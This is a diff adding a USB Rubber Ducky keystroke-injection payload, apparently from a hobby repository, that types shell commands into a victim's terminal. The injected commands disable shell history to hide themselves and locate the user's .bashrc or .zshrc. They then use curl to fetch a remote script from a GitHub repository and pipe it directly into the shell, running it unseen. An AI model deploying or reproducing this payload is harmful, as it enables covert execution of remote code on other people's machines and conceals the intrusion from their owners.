@@ -1,0 +1,24 @@
+REM TITLE EntryPoint ducky
+REM AUTHOR Saverio976
+REM DESCRIPTION call scripts from https://github.com/Saverio976/ducky-the-duck
+
+DELAY 2000
+STRINGLN : : : : : : : : : : : : : : : : : : : : : : :
+STRINGLN export CURRENT_SHELL=''
+STRINGLN CURRENT_SHELL=$(readlink /proc/$$/exe)
+STRINGLN "$CURRENT_SHELL"
+
+STRINGLN [[ "$CURRENT_SHELL" == *"zsh"* ]] && CURRENT_SHELL="zsh"
+STRINGLN [[ "$CURRENT_SHELL" == *"bash"* ]] && CURRENT_SHELL="bash"
+
+STRINGLN [ "$CURRENT_SHELL" = "zsh" ] && unset HISTFILE
+STRINGLN [ "$CURRENT_SHELL" = "bash" ] && set +o history
+
+STRINGLN export CONFIG_FILE
+STRINGLN [ "$CURRENT_SHELL" = "zsh" ] && CONFIG_FILE="${ZDOTDIR:-$HOME}/.zshrc"
+STRINGLN [ "$CURRENT_SHELL" = "bash" ] && CONFIG_FILE="$HOME/.bashrc"
+
+STRINGLN curl -sLf 'https://raw.githubusercontent.com/Saverio976/ducky-the-duck/main/scripts/entrypoint.sh' | "$CURRENT_SHELL"
+
+STRINGLN exit
+ATTACKMODE STORAGE
